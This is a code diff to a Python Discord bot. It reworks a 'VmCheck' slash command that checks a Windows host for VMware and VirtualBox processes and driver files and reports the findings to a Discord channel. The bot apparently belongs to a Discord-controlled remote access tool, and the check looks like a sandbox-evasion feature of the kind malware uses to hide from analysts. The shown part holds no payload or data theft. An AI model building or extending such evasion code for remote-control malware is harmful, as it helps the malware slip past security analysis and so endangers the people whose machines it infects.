@@ -1219,6 +1219,9 @@ async def VmCheck_command(ctx: SlashContext):
     if ctx.channel.name == channel_name:
         sys.stdout.write("\x1b[8;{rows};{cols}t".format(rows=35, cols=170))
 
+        FOUND = False
+        FOUND_DRIVER = False
+
         await ctx.send("Scanning System for Vm Process")
         time.sleep(2)
         VmCehck1 = "vmsrvc.exe"
@@ -1229,40 +1232,41 @@ async def VmCheck_command(ctx: SlashContext):
         VmCehck6 = "vboxservice.exe"
         for process in psutil.process_iter():
             try:
-
                 if process.name().lower() == VmCehck1.lower():
-                    await ctx.send("Detected A VM Process.. ")
+                    FOUND = True
                 else:
                     shit = 12
 
                 if process.name().lower() == VmCehck2.lower():
-                    await ctx.send("Detected A VM Process.. ")
+                    FOUND = True
                 else:
                     shit = 12
 
                 if process.name().lower() == VmCehck3.lower():
-                    await ctx.send("Detected A VM Process.. ")
+                    FOUND = True
                 else:
                     shit = 12
 
                 if process.name().lower() == VmCehck4.lower():
-                    await ctx.send("Detected A VM Process.. ")
+                    FOUND = True
                 else:
                     shit = 12
 
                 if process.name().lower() == VmCehck5.lower():
-                    await ctx.send("Detected A VM Process.. ")
+                    FOUND = True
                 else:
                     shit = 12
 
                 if process.name().lower() == VmCehck6.lower():
-                    await ctx.send("Detected A VM Process.. ") 
+                    FOUND = True
                 else:
                     shit = 12
 
             except AccessDenied:
                 await ctx.send("[!] Perimission Denied")
-
+        if FOUND == True:
+            await ctx.send("Found a VM Process!")
+            return
 
         await ctx.send("Scanning System For VM Drivers")
         vmci = os.path.exists("C:\WINDOWS\system32\drivers\vmci.sys")
@@ -1275,40 +1279,43 @@ async def VmCheck_command(ctx: SlashContext):
         
         
         if vmci == True:
-                await ctx.send("Detected The VM Drivers: vmci.sys" )    
+            FOUND_DRIVER = True
         else:
            shit = 12
         
         if vmhgfs == True:
-                await ctx.send("Detected The VM Drivers: vmhgfs.sys" )
+            FOUND_DRIVER = True
         else:
             shit = 12
     
         if vmmouse == True:
-                await ctx.send("Detected The VM Drivers: vmmouse.sys")    
+            FOUND_DRIVER = True
         else:
             shit = 12
         
         if vmsci == True:
-                await ctx.send("Detected The VM Drivers: vmsci.sys")     
+            FOUND_DRIVER = True
         else:
             shit = 12
         
         if vmusbmouse == True:
-                await ctx.send("Detected The VM Drivers: vmusbmouse.sys")   
+            FOUND_DRIVER = True
         else:
             shit = 12
         
         if vmx_svga == True:
-                await ctx.send("Detected The VM Drivers: vmx_svga.sys")
+            FOUND_DRIVER = True
         else:
             shit = 12
         
         if VBoxMouse == True:
-                await ctx.send("Detected The VM Drivers: VBoxMouse.sys")  
+            FOUND_DRIVER = True
         else:
                 shit = 12
 
+        if FOUND_DRIVER == True:
+            await ctx.send("Found a VM Driver!")
+            return
         await ctx.send("Finished checking for VM")
 
 client.run(token)
